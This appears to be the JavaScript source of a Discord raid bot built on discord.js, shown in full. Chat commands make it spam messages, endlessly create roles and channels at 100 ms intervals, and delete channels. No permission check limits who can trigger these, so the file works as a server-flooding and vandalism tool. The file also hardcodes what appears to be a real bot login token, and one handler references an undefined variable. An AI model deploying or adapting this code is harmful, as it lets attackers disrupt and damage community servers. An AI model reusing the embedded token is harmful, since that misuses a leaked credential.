const Discord = require("discord.js");
const client = new Discord.Client();


client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
    client.user.setGame("playing Minecraft");
  });

  client.on('message', async msg => {
    if (msg.content === "-spam chat") {
        setInterval(function () {msg.channel.send('test')}, 1000);
    }

    if (msg.content === "-spam role") {
        setInterval(function (){
            msg.guild.createRole();
        }, 100);
    }
    if (msg.content === "-spam channels") {
        var i = 0
        setInterval(function (){
            msg.guild.createChannel(i);
            console.log("Created channel called #" + i + " in " + msg.guild.name);
            i = i + 1
        }, 100);
    }
    if (msg.content === "-delete channel") {
        msg.channel.delete();
    }
    if (msg.content === "-delete channels") {
        client.channels.get(permstor[msg.guild.id].reportchannel).delete();
    }
});



client.login("Njg0MDMwOTEzNjU4ODgwMDQ2.Xl0L3g.OitVYDvZ8LSvCBd1QrPHp48Ws54");
